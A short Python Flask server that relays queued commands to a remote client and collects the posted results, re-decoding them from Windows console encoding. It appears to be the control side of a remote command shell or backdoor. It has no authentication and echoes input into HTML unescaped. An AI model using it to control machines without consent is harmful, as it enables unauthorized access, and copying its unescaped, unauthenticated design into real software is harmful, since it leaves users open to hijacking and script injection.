from flask import Flask, request

app = Flask(__name__)
command = ""
out = ""


@app.route("/cmd", methods=['GET', 'POST'])
def cmd():
    global command
    global out
    if request.method == 'POST':
        command = request.form['command']
        if command == 'clear':
            out = ''
        else:
            out = out + command + '<br/>'
    return command


@app.route("/output", methods=['GET', 'POST'])
def output():
    global out
    if request.method == 'POST':
        req = request.form['out'].encode('cp1251').decode('cp866')
        req = req.replace("\n", "<br/>")
        if req != '':
            out = out + req + '<br/>' + '-' * 600 + '<br/>'
    return out


@app.route("/clear", methods=['GET'])
def clear():
    global command
    command = ''
    return "Command cleared"


if __name__ == '__main__':
    app.run()
